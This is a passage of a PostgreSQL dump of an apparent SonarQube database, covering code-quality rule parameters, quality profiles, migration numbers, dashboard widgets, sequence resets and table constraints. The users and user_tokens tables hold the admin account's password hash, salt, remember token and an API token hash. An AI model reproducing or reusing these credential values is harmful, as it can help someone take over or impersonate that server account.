46	598	max	Maximum allowed control flow statement nesting depth.	INTEGER	3
47	615	format	Regular expression used to check the field names against.	STRING	^[a-z][a-zA-Z0-9]*$
48	616	forClasses	Pattern of classes which should adhere to this constraint. Ex : **.api.**	STRING	**
49	629	max	Maximum number of allowed conditional operators in an expression	INTEGER	3
50	630	Max	Maximum allowed lines in an anonymous class/lambda	INTEGER	20
51	646	max	Maximum complexity allowed.	INTEGER	200
52	673	regex	The regular expression the "artifactId" should match	STRING	[a-z][a-z-0-9]+
53	682	factoryMethod	the fully-qualified name of a factory method that returns an open resource, with or without a parameter list. E.G. "org.assoc.res.ResourceFactory$Innerclass#create" or "org.assoc.res.SpecialResourceFactory#create(java.lang.String, int)"	STRING	\N
54	682	closingMethod	the fully-qualified name of the method which closes the open resource, with or without a parameter list. E.G. "org.assoc.res.MyResource#closeMe" or "org.assoc.res.MySpecialResource#closeMe(java.lang.String, int)"	STRING	\N
55	682	constructor	the fully-qualified name of a constructor that creates an open resource. An optional signature may be specified after the class name. E.G. "org.assoc.res.MyResource" or "org.assoc.res.MySpecialResource(java.lang.String, int)"	STRING	\N
56	682	openingMethod	the fully-qualified name of a method that opens an existing resource, with or without a parameter list. E.G. "org.assoc.res.ResourceFactory#create" or "org.assoc.res.SpecialResourceFactory #create(java.lang.String, int)"	STRING	\N
57	691	maximum	Maximum number of case	INTEGER	30
58	696	dependencyName	Pattern describing forbidden dependencies group and artifact ids. E.G. '``*:.*log4j``' or '``x.y:*``'	STRING	\N
59	696	version	Dependency version pattern or dash-delimited range. Leave blank for all versions. E.G. '``1.3.*``', '``1.0-3.1``', '``1.0-*``' or '``*-3.1``'	STRING	\N
60	698	regex	The regular expression the "groupId" should match	STRING	(com|org)(\\.[a-z][a-z-0-9]*)+
61	723	max	Maximum authorized number of parameters	INTEGER	7
62	723	constructorMax	Maximum authorized number of parameters for a constructor	INTEGER	7
63	727	max	Maximum allowed return statements per method	INTEGER	3
64	735	maximumLineLength	The maximum authorized line length.	INTEGER	120
65	743	Max	Maximum authorized lines in a file.	INTEGER	1000
66	748	format	Regular expression used to check the package names against.	STRING	^[a-z]+(\\.[a-z][a-z0-9]*)*$
67	754	format	Regular expression used to check the abstract class names against.	STRING	^Abstract[A-Z][a-zA-Z0-9]*$
68	756	format	Regular expression used to check the names against.	STRING	^[a-z][a-zA-Z0-9]*$
69	759	format	Regular expression used to check the type parameter names against.	STRING	^[A-Z][0-9]?$
70	762	format	Regular expression used to check the interface names against.	STRING	^[A-Z][a-zA-Z0-9]*$
71	766	format	Regular expression used to check the field names against.	STRING	^[a-z][a-zA-Z0-9]*$
72	768	format	Regular expression used to check the constant names against.	STRING	^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$
73	771	minimumBranchCoverageRatio	\N	FLOAT	65
74	772	minimumLineCoverageRatio	\N	FLOAT	65
75	773	minimumCommentDensity	\N	FLOAT	25
76	778	max	Maximum authorized lines in a function	INTEGER	100
77	783	maximumNestingLevel	Maximum allowed "if/for/while/switch/try" statements nesting depth	INTEGER	3
78	800	regularExpression	The regular expression	STRING	\N
79	800	message	The issue message	STRING	The regular expression matches this comment.
80	802	maximumFunctionComplexityThreshold	The maximum authorized complexity in function	INTEGER	10
81	807	legalCommentPattern	Pattern for text of trailing comments that are allowed.	STRING	^//\\s*+[^\\s]++$
82	809	threshold	Number of allowed repetition before triggering an issue	INTEGER	2
83	815	format	Regular expression used to check the variable names against	STRING	^\\$[a-z][a-zA-Z0-9]*$
84	824	max	Maximum number of allowed conditional operators in an expression	INTEGER	3
85	827	maximumFunctionParameters	The maximum authorized number of parameters	INTEGER	7
86	829	body_braces	True to require curly braces around function body. False to forbid them for single-return bodies.	BOOLEAN	false
87	829	parameter_parens	True to require parentheses around parameters. False to forbid them for single parameter.	BOOLEAN	false
88	851	headerFormat	Expected copyright and license header (plain text)	TEXT	\N
89	860	format	Regular expression used to check the function names against.	STRING	^[a-z][a-zA-Z0-9]*$
90	866	domainsToIgnore	Comma-delimited list of domains to ignore. Regexes may be used, e.g. (.*\\.)?example.com,foo.org	STRING	\N
91	889	considerJSDoc	Consider only functions with @constructor tag as constructor functions	BOOLEAN	false
92	898	maximum	Maximum authorized lines in a file.	INTEGER	1000
93	905	maximumLineLength	The maximum authorized line length.	INTEGER	80
\.


--
-- TOC entry 2637 (class 0 OID 32872)
-- Dependencies: 203
-- Data for Name: rules_profiles; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY rules_profiles (id, name, language, kee, parent_kee, rules_updated_at, created_at, updated_at, is_default) FROM stdin;
1	Sonar way	cs	cs-sonar-way-15357	\N	2017-11-23T16:16:51+0000	2017-11-23 16:16:50.927	2017-11-23 16:16:51.451	t
2	Sonar way	java	java-sonar-way-86530	\N	2017-11-23T16:16:52+0000	2017-11-23 16:16:51.457	2017-11-23 16:16:52.471	t
4	Sonar Security Way	js	js-sonar-security-way-66631	\N	2017-11-23T16:16:53+0000	2017-11-23 16:16:52.923	2017-11-23 16:16:53.135	f
3	Sonar way	js	js-sonar-way-48125	\N	2017-11-23T16:16:52+0000	2017-11-23 16:16:52.481	2017-11-23 16:16:53.141	t
\.


--
-- TOC entry 2619 (class 0 OID 32768)
-- Dependencies: 185
-- Data for Name: schema_migrations; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY schema_migrations (version) FROM stdin;
1
2
10
11
14
35
53
59
61
62
79
80
86
87
88
93
95
131
140
151
163
169
200
202
211
215
217
220
222
235
237
238
239
252
257
283
285
286
300
301
320
350
351
353
354
355
356
358
370
387
388
391
392
398
399
401
404
405
410
411
412
413
414
415
416
417
418
419
432
433
434
441
442
460
461
463
464
465
467
480
483
486
488
492
510
511
520
530
532
533
535
536
538
540
541
542
544
545
548
549
552
555
580
581
600
601
603
604
605
702
703
704
705
706
707
708
709
710
711
712
713
714
715
716
717
718
719
720
721
750
752
753
754
755
756
758
759
760
761
762
763
764
765
766
768
769
770
771
772
773
775
776
777
778
779
780
781
782
783
784
786
787
788
789
790
791
792
793
794
795
796
900
901
902
903
904
905
906
907
908
912
913
915
916
917
918
919
920
921
922
923
924
925
926
927
929
930
931
932
933
934
935
936
937
938
939
940
941
1000
1001
1003
1004
1005
1006
1007
1008
1009
1010
1011
1012
1013
1014
1015
1017
1100
1101
1102
1103
1104
1105
1106
1107
1108
1109
1110
1111
1112
1113
1114
1115
1116
1117
1118
1119
1120
1121
1122
1123
1124
1125
1150
1151
1152
1153
1155
1156
1157
\.


--
-- TOC entry 2623 (class 0 OID 32786)
-- Dependencies: 189
-- Data for Name: snapshots; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY snapshots (id, project_id, parent_snapshot_id, status, islast, scope, qualifier, root_snapshot_id, version, path, depth, root_project_id, purge_status, period1_mode, period1_param, period2_mode, period2_param, period3_mode, period3_param, period4_mode, period4_param, period5_mode, period5_param, created_at, build_date, period1_date, period2_date, period3_date, period4_date, period5_date) FROM stdin;
\.


--
-- TOC entry 2652 (class 0 OID 32975)
-- Dependencies: 218
-- Data for Name: user_roles; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY user_roles (id, user_id, resource_id, role) FROM stdin;
\.


--
-- TOC entry 2706 (class 0 OID 33563)
-- Dependencies: 272
-- Data for Name: user_tokens; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY user_tokens (id, login, name, token_hash, created_at) FROM stdin;
1	admin	carina-demo	d05f2958d44a3100474ee7fbf17e98692002972269d3229fb3abe8e434edc4ae7cf0413cf00cc575cefa20ce14583215	1511453879163
\.


--
-- TOC entry 2635 (class 0 OID 32860)
-- Dependencies: 201
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY users (id, login, name, email, crypted_password, salt, remember_token, remember_token_expires_at, active, created_at, updated_at, scm_accounts, external_identity, external_identity_provider, user_local) FROM stdin;
1	admin	Administrator		17975ebe0ddabddc6c9f60df87e78af09ee82300	34ae8c3ba5d09a7750559cc6c9e99cd9291c74e2	e93033b986a8e911902cfc5b0654586ba0600bff	2017-12-07 16:17:01.605	t	1511453796996	1511453837021	\N	admin	sonarqube	t
\.


--
-- TOC entry 2660 (class 0 OID 33090)
-- Dependencies: 226
-- Data for Name: widget_properties; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY widget_properties (id, widget_id, kee, text_value) FROM stdin;
1	7	filter	1
2	7	distributionAxis	createdAt
3	9	filter	2
4	9	pageSize	50
5	10	filter	1
6	10	pageSize	20
7	11	filter	1
8	11	colorMetric	coverage
9	11	sizeMetric	ncloc
\.


--
-- TOC entry 2658 (class 0 OID 33077)
-- Dependencies: 224
-- Data for Name: widgets; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY widgets (id, dashboard_id, widget_key, name, description, column_index, row_index, configured, created_at, updated_at, resource_id) FROM stdin;
1	1	size	\N	\N	1	1	t	2017-11-23 16:16:53.576	2017-11-23 16:16:53.576	\N
2	1	code_coverage	\N	\N	1	2	t	2017-11-23 16:16:53.576	2017-11-23 16:16:53.576	\N
3	1	duplications	\N	\N	1	3	t	2017-11-23 16:16:53.576	2017-11-23 16:16:53.576	\N
4	1	documentation_comments	\N	\N	1	4	t	2017-11-23 16:16:53.576	2017-11-23 16:16:53.576	\N
5	1	rules	\N	\N	2	1	t	2017-11-23 16:16:53.576	2017-11-23 16:16:53.576	\N
6	1	timeline	\N	\N	2	2	t	2017-11-23 16:16:53.576	2017-11-23 16:16:53.576	\N
7	1	project_issue_filter	\N	\N	2	3	t	2017-11-23 16:16:53.576	2017-11-23 16:16:53.576	\N
8	2	welcome	\N	\N	1	1	t	2017-11-23 16:16:53.607	2017-11-23 16:16:53.607	\N
9	2	measure_filter_list	\N	\N	1	2	t	2017-11-23 16:16:53.607	2017-11-23 16:16:53.607	\N
10	2	measure_filter_list	\N	\N	2	1	t	2017-11-23 16:16:53.607	2017-11-23 16:16:53.607	\N
11	2	measure_filter_treemap	\N	\N	2	2	t	2017-11-23 16:16:53.607	2017-11-23 16:16:53.607	\N
\.


--
-- TOC entry 2757 (class 0 OID 0)
-- Dependencies: 219
-- Name: active_dashboards_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('active_dashboards_id_seq', 2, true);


--
-- TOC entry 2758 (class 0 OID 0)
-- Dependencies: 206
-- Name: active_rule_parameters_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('active_rule_parameters_id_seq', 29, true);


--
-- TOC entry 2759 (class 0 OID 0)
-- Dependencies: 204
-- Name: active_rules_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('active_rules_id_seq', 481, true);


--
-- TOC entry 2760 (class 0 OID 0)
-- Dependencies: 261
-- Name: activities_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('activities_id_seq', 481, true);


--
-- TOC entry 2761 (class 0 OID 0)
-- Dependencies: 236
-- Name: authors_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('authors_id_seq', 1, false);


--
-- TOC entry 2762 (class 0 OID 0)
-- Dependencies: 267
-- Name: ce_activity_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('ce_activity_id_seq', 1, false);


--
-- TOC entry 2763 (class 0 OID 0)
-- Dependencies: 269
-- Name: ce_queue_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('ce_queue_id_seq', 1, false);


--
-- TOC entry 2764 (class 0 OID 0)
-- Dependencies: 221
-- Name: dashboards_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('dashboards_id_seq', 2, true);


--
-- TOC entry 2765 (class 0 OID 0)
-- Dependencies: 242
-- Name: duplications_index_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('duplications_index_id_seq', 1, false);


--
-- TOC entry 2766 (class 0 OID 0)
-- Dependencies: 208
-- Name: events_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('events_id_seq', 1, false);


--
-- TOC entry 2767 (class 0 OID 0)
-- Dependencies: 263
-- Name: file_sources_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('file_sources_id_seq', 1, false);


--
-- TOC entry 2768 (class 0 OID 0)
-- Dependencies: 215
-- Name: group_roles_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('group_roles_id_seq', 12, true);


--
-- TOC entry 2769 (class 0 OID 0)
-- Dependencies: 212
-- Name: groups_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('groups_id_seq', 2, true);


--
-- TOC entry 2770 (class 0 OID 0)
-- Dependencies: 245
-- Name: issue_changes_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('issue_changes_id_seq', 1, false);


--
-- TOC entry 2771 (class 0 OID 0)
-- Dependencies: 249
-- Name: issue_filter_favourites_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('issue_filter_favourites_id_seq', 1, false);


--
-- TOC entry 2772 (class 0 OID 0)
-- Dependencies: 247
-- Name: issue_filters_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('issue_filters_id_seq', 3, true);


--
-- TOC entry 2773 (class 0 OID 0)
-- Dependencies: 243
-- Name: issues_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('issues_id_seq', 1, false);


--
-- TOC entry 2774 (class 0 OID 0)
-- Dependencies: 232
-- Name: loaded_templates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('loaded_templates_id_seq', 17, true);


--
-- TOC entry 2775 (class 0 OID 0)
-- Dependencies: 227
-- Name: manual_measures_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('manual_measures_id_seq', 1, false);


--
-- TOC entry 2776 (class 0 OID 0)
-- Dependencies: 240
-- Name: measure_filter_favourites_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('measure_filter_favourites_id_seq', 1, false);


--
-- TOC entry 2777 (class 0 OID 0)
-- Dependencies: 238
-- Name: measure_filters_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('measure_filters_id_seq', 2, true);


--
-- TOC entry 2778 (class 0 OID 0)
-- Dependencies: 190
-- Name: metrics_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('metrics_id_seq', 139, true);


--
-- TOC entry 2779 (class 0 OID 0)
-- Dependencies: 229
-- Name: notifications_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('notifications_id_seq', 1, false);


--
-- TOC entry 2780 (class 0 OID 0)
-- Dependencies: 255
-- Name: perm_templates_groups_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('perm_templates_groups_id_seq', 4, true);


--
-- TOC entry 2781 (class 0 OID 0)
-- Dependencies: 253
-- Name: perm_templates_users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('perm_templates_users_id_seq', 1, false);


--
-- TOC entry 2782 (class 0 OID 0)
-- Dependencies: 251
-- Name: permission_templates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('permission_templates_id_seq', 1, true);


--
-- TOC entry 2783 (class 0 OID 0)
-- Dependencies: 198
-- Name: project_links_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('project_links_id_seq', 1, false);


--
-- TOC entry 2784 (class 0 OID 0)
-- Dependencies: 192
-- Name: project_measures_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('project_measures_id_seq', 1, false);


--
-- TOC entry 2785 (class 0 OID 0)
-- Dependencies: 265
-- Name: project_qprofiles_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('project_qprofiles_id_seq', 1, false);


--
-- TOC entry 2786 (class 0 OID 0)
-- Dependencies: 186
-- Name: projects_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('projects_id_seq', 1, true);


--
-- TOC entry 2787 (class 0 OID 0)
-- Dependencies: 210
-- Name: properties_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('properties_id_seq', 15, true);


--
-- TOC entry 2788 (class 0 OID 0)
-- Dependencies: 259
-- Name: quality_gate_conditions_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('quality_gate_conditions_id_seq', 4, true);


--
-- TOC entry 2789 (class 0 OID 0)
-- Dependencies: 257
-- Name: quality_gates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('quality_gates_id_seq', 1, true);


--
-- TOC entry 2790 (class 0 OID 0)
-- Dependencies: 234
-- Name: resource_index_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('resource_index_id_seq', 9, true);


--
-- TOC entry 2791 (class 0 OID 0)
-- Dependencies: 194
-- Name: rules_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('rules_id_seq', 913, true);


--
-- TOC entry 2792 (class 0 OID 0)
-- Dependencies: 196
-- Name: rules_parameters_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('rules_parameters_id_seq', 93, true);


--
-- TOC entry 2793 (class 0 OID 0)
-- Dependencies: 202
-- Name: rules_profiles_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('rules_profiles_id_seq', 4, true);


--
-- TOC entry 2794 (class 0 OID 0)
-- Dependencies: 188
-- Name: snapshots_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('snapshots_id_seq', 1, false);


--
-- TOC entry 2795 (class 0 OID 0)
-- Dependencies: 217
-- Name: user_roles_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('user_roles_id_seq', 1, false);


--
-- TOC entry 2796 (class 0 OID 0)
-- Dependencies: 271
-- Name: user_tokens_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('user_tokens_id_seq', 1, true);


--
-- TOC entry 2797 (class 0 OID 0)
-- Dependencies: 200
-- Name: users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('users_id_seq', 1, true);


--
-- TOC entry 2798 (class 0 OID 0)
-- Dependencies: 225
-- Name: widget_properties_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('widget_properties_id_seq', 9, true);


--
-- TOC entry 2799 (class 0 OID 0)
-- Dependencies: 223
-- Name: widgets_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('widgets_id_seq', 11, true);


--
-- TOC entry 2411 (class 2606 OID 33061)
-- Name: active_dashboards active_dashboards_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY active_dashboards
    ADD CONSTRAINT active_dashboards_pkey PRIMARY KEY (id);


--
-- TOC entry 2388 (class 2606 OID 32898)
-- Name: active_rule_parameters active_rule_parameters_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY active_rule_parameters
    ADD CONSTRAINT active_rule_parameters_pkey PRIMARY KEY (id);


--
-- TOC entry 2385 (class 2606 OID 32887)
-- Name: active_rules active_rules_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY active_rules
    ADD CONSTRAINT active_rules_pkey PRIMARY KEY (id);


--
-- TOC entry 2479 (class 2606 OID 33472)
-- Name: activities activities_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY activities
    ADD CONSTRAINT activities_pkey PRIMARY KEY (id);


--
-- TOC entry 2438 (class 2606 OID 33242)
-- Name: authors authors_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY authors
    ADD CONSTRAINT authors_pkey PRIMARY KEY (id);


--
-- TOC entry 2492 (class 2606 OID 33539)
-- Name: ce_activity ce_activity_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY ce_activity
    ADD CONSTRAINT ce_activity_pkey PRIMARY KEY (id);


--
-- TOC entry 2496 (class 2606 OID 33549)
-- Name: ce_queue ce_queue_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY ce_queue
    ADD CONSTRAINT ce_queue_pkey PRIMARY KEY (id);


--
-- TOC entry 2414 (class 2606 OID 33074)
-- Name: dashboards dashboards_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY dashboards
    ADD CONSTRAINT dashboards_pkey PRIMARY KEY (id);


--
-- TOC entry 2429 (class 2606 OID 33553)
-- Name: duplications_index duplications_index_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY duplications_index
    ADD CONSTRAINT duplications_index_pkey PRIMARY KEY (id);


--
-- TOC entry 2391 (class 2606 OID 32921)
-- Name: events events_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY events
    ADD CONSTRAINT events_pkey PRIMARY KEY (id);


--
-- TOC entry 2481 (class 2606 OID 33507)
-- Name: file_sources file_sources_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY file_sources
    ADD CONSTRAINT file_sources_pkey PRIMARY KEY (id);


--
-- TOC entry 2402 (class 2606 OID 32970)
-- Name: group_roles group_roles_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY group_roles
    ADD CONSTRAINT group_roles_pkey PRIMARY KEY (id);


--
-- TOC entry 2397 (class 2606 OID 32957)
-- Name: groups groups_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY groups
    ADD CONSTRAINT groups_pkey PRIMARY KEY (id);


--
-- TOC entry 2459 (class 2606 OID 33427)
-- Name: issue_changes issue_changes_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY issue_changes
    ADD CONSTRAINT issue_changes_pkey PRIMARY KEY (id);


--
-- TOC entry 2464 (class 2606 OID 33374)
-- Name: issue_filter_favourites issue_filter_favourites_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY issue_filter_favourites
    ADD CONSTRAINT issue_filter_favourites_pkey PRIMARY KEY (id);


--
-- TOC entry 2462 (class 2606 OID 33365)
-- Name: issue_filters issue_filters_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY issue_filters
    ADD CONSTRAINT issue_filters_pkey PRIMARY KEY (id);


--
-- TOC entry 2451 (class 2606 OID 33407)
-- Name: issues issues_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY issues
    ADD CONSTRAINT issues_pkey PRIMARY KEY (id);


--
-- TOC entry 2432 (class 2606 OID 33177)
-- Name: loaded_templates loaded_templates_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY loaded_templates
    ADD CONSTRAINT loaded_templates_pkey PRIMARY KEY (id);


--
-- TOC entry 2424 (class 2606 OID 33138)
-- Name: manual_measures manual_measures_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY manual_measures
    ADD CONSTRAINT manual_measures_pkey PRIMARY KEY (id);


--
-- TOC entry 2444 (class 2606 OID 33280)
-- Name: measure_filter_favourites measure_filter_favourites_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY measure_filter_favourites
    ADD CONSTRAINT measure_filter_favourites_pkey PRIMARY KEY (id);


--
-- TOC entry 2442 (class 2606 OID 33271)
-- Name: measure_filters measure_filters_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY measure_filters
    ADD CONSTRAINT measure_filters_pkey PRIMARY KEY (id);


--
-- TOC entry 2363 (class 2606 OID 32805)
-- Name: metrics metrics_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY metrics
    ADD CONSTRAINT metrics_pkey PRIMARY KEY (id);


--
-- TOC entry 2426 (class 2606 OID 33157)
-- Name: notifications notifications_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY notifications
    ADD CONSTRAINT notifications_pkey PRIMARY KEY (id);


--
-- TOC entry 2471 (class 2606 OID 33402)
-- Name: perm_templates_groups perm_templates_groups_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY perm_templates_groups
    ADD CONSTRAINT perm_templates_groups_pkey PRIMARY KEY (id);


--
-- TOC entry 2469 (class 2606 OID 33394)
-- Name: perm_templates_users perm_templates_users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY perm_templates_users
    ADD CONSTRAINT perm_templates_users_pkey PRIMARY KEY (id);


--
-- TOC entry 2467 (class 2606 OID 33386)
-- Name: permission_templates permission_templates_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY permission_templates
    ADD CONSTRAINT permission_templates_pkey PRIMARY KEY (id);


--
-- TOC entry 2376 (class 2606 OID 32849)
-- Name: project_links project_links_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY project_links
    ADD CONSTRAINT project_links_pkey PRIMARY KEY (id);


--
-- TOC entry 2368 (class 2606 OID 33002)
-- Name: project_measures project_measures_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY project_measures
    ADD CONSTRAINT project_measures_pkey PRIMARY KEY (id);


--
-- TOC entry 2486 (class 2606 OID 33525)
-- Name: project_qprofiles project_qprofiles_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY project_qprofiles
    ADD CONSTRAINT project_qprofiles_pkey PRIMARY KEY (id);


--
-- TOC entry 2350 (class 2606 OID 32783)
-- Name: projects projects_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY projects
    ADD CONSTRAINT projects_pkey PRIMARY KEY (id);


--
-- TOC entry 2395 (class 2606 OID 32934)
-- Name: properties properties_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY properties
    ADD CONSTRAINT properties_pkey PRIMARY KEY (id);


--
-- TOC entry 2476 (class 2606 OID 33457)
-- Name: quality_gate_conditions quality_gate_conditions_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY quality_gate_conditions
    ADD CONSTRAINT quality_gate_conditions_pkey PRIMARY KEY (id);


--
-- TOC entry 2473 (class 2606 OID 33448)
-- Name: quality_gates quality_gates_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY quality_gates
    ADD CONSTRAINT quality_gates_pkey PRIMARY KEY (id);


--
-- TOC entry 2435 (class 2606 OID 33185)
-- Name: resource_index resource_index_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY resource_index
    ADD CONSTRAINT resource_index_pkey PRIMARY KEY (id);


--
-- TOC entry 2373 (class 2606 OID 32838)
-- Name: rules_parameters rules_parameters_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY rules_parameters
    ADD CONSTRAINT rules_parameters_pkey PRIMARY KEY (id);


--
-- TOC entry 2370 (class 2606 OID 32827)
-- Name: rules rules_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY rules
    ADD CONSTRAINT rules_pkey PRIMARY KEY (id);


--
-- TOC entry 2382 (class 2606 OID 32879)
-- Name: rules_profiles rules_profiles_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY rules_profiles
    ADD CONSTRAINT rules_profiles_pkey PRIMARY KEY (id);


--
-- TOC entry 2358 (class 2606 OID 32793)
-- Name: snapshots snapshots_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY snapshots
    ADD CONSTRAINT snapshots_pkey PRIMARY KEY (id);


--
-- TOC entry 2406 (class 2606 OID 32980)
-- Name: user_roles user_roles_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY user_roles
    ADD CONSTRAINT user_roles_pkey PRIMARY KEY (id);


--
-- TOC entry 2500 (class 2606 OID 33571)
-- Name: user_tokens user_tokens_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY user_tokens
    ADD CONSTRAINT user_tokens_pkey PRIMARY KEY (id);


--
-- TOC entry 2379 (class 2606 OID 32868)
-- Name: users users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY users
    ADD CONSTRAINT users_pkey PRIMARY KEY (id);


--
-- TOC entry 2420 (class 2606 OID 33098)
-- Name: widget_properties widget_properties_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY widget_properties
